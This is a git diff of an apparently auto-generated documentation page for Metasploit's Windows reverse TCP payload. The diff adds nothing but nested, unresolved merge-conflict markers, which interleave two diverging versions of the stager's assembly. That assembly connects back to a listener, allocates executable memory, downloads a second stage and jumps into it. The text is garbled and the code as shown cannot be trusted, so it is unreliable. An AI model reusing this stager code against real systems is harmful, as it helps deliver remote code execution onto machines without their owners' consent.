@@ -611,6 +611,9 @@ certain payloads if requested.</p>
 247
 248
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
 249
 250
 251
@@ -630,9 +633,12 @@ certain payloads if requested.</p>
 265
 266
 267</pre>
+<<<<<<< HEAD
 =======
 249</pre>
 >>>>>>> origin/gh-pages
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
     </td>
     <td>
       <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_tcp.rb', line 98</span>
@@ -651,6 +657,9 @@ certain payloads if requested.</p>
 
     reverse_tcp:
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
       push &#39;32&#39;               ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.
       push &#39;ws2_&#39;             ; ...
       push esp                ; Push a pointer to the &quot;ws2_32&quot; string on the stack.
@@ -697,6 +706,7 @@ certain payloads if requested.</p>
     handle_connect_failure:
       ; decrement our attempt count and try again
       dec [esi+8]
+<<<<<<< HEAD
 =======
       push 0x00003233        ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.
       push 0x5F327377        ; ...
@@ -743,12 +753,17 @@ certain payloads if requested.</p>
     handle_failure:
       dec dword [esi+8]
 >>>>>>> origin/gh-pages
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
       jnz try_connect
   </span><span class='tstring_end'>^</span></span>
 
   <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
     <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
     failure:
       call exitfunk
     </span><span class='tstring_end'>^</span></span>
@@ -765,6 +780,7 @@ certain payloads if requested.</p>
     ; the UUID stuff if required.
     connected:
   </span><span class='tstring_end'>^</span></span>
+<<<<<<< HEAD
 =======
       failure:
         call exitfunk
@@ -790,6 +806,8 @@ certain payloads if requested.</p>
     connected:
     </span><span class='tstring_end'>^</span></span>
 >>>>>>> origin/gh-pages
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
 
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_asm_send_uuid'>asm_send_uuid</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
 
@@ -797,6 +815,9 @@ certain payloads if requested.</p>
     recv:
       ; Receive the size of the incoming second stage...
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
       push 0                  ; flags
       push 4                  ; length = sizeof( DWORD );
       push esi                ; the 4 byte buffer on the stack to hold the second stage length
@@ -812,6 +833,7 @@ certain payloads if requested.</p>
       cmp eax, 0
       jle cleanup_socket
     </span><span class='tstring_end'>^</span></span>
+<<<<<<< HEAD
 =======
       push 0                 ; flags
       push 4                 ; length = sizeof( DWORD );
@@ -829,11 +851,16 @@ certain payloads if requested.</p>
         jle failure
       </span><span class='tstring_end'>^</span></span>
 >>>>>>> origin/gh-pages
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
   <span class='kw'>end</span>
 
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
       ; Alloc a RWX buffer for the second stage
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
       mov esi, [esi]          ; dereference the pointer to the second stage length
       push 0x40               ; PAGE_EXECUTE_READWRITE
       push 0x1000             ; MEM_COMMIT
@@ -882,6 +909,7 @@ certain payloads if requested.</p>
 
       ; try again
       jmp create_socket
+<<<<<<< HEAD
 =======
       mov esi, [esi]         ; dereference the pointer to the second stage length
       push 0x40              ; PAGE_EXECUTE_READWRITE
@@ -910,22 +938,30 @@ certain payloads if requested.</p>
       cmp eax, 0
       jle failure
 >>>>>>> origin/gh-pages
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
     </span><span class='tstring_end'>^</span></span>
   <span class='kw'>end</span>
 
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
     read_successful:
       add ebx, eax            ; buffer += bytes_received
       sub esi, eax            ; length -= bytes_received, will set flags
       jnz read_more           ; continue if we have more to read
       ret                     ; return into the second stage
+<<<<<<< HEAD
 =======
       add ebx, eax           ; buffer += bytes_received
       sub esi, eax           ; length -= bytes_received, will set flags
       jnz read_more          ; continue if we have more to read
       ret                    ; return into the second stage
 >>>>>>> origin/gh-pages
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
   </span><span class='tstring_end'>^</span></span>
 
   <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
@@ -1155,11 +1191,15 @@ certain payloads if requested.</p>
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>=</span> <span class='id identifier rubyid_cached_size'>cached_size</span>
 
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
   <span class='comment'># EXITFUNK &#39;thread&#39; is the biggest by far, adds 29 bytes.
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>29</span>
 
   <span class='comment'># Reliability adds some bytes!
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>44</span>
+<<<<<<< HEAD
 =======
   <span class='comment'># EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>31</span>
@@ -1167,6 +1207,8 @@ certain payloads if requested.</p>
   <span class='comment'># Reliability adds 10 bytes for recv error checks
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>10</span>
 >>>>>>> origin/gh-pages
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
 
   <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='id identifier rubyid_uuid_required_size'>uuid_required_size</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
 
@@ -1215,6 +1257,7 @@ certain payloads if requested.</p>
     <div id="footer">
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
   Generated on Tue Dec 22 22:32:07 2015 by
 =======
   Generated on Tue Dec  8 22:32:13 2015 by
@@ -1226,6 +1269,11 @@ certain payloads if requested.</p>
   <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
   0.8.7.6 (ruby-2.1.5).
 >>>>>>> origin/gh-pages
+=======
+  Generated on Tue Dec  8 22:32:13 2015 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.8.7.6 (ruby-2.1.7).
+>>>>>>> origin/pod/metasploit-excellent.mp3
 </div>
 
   </body>
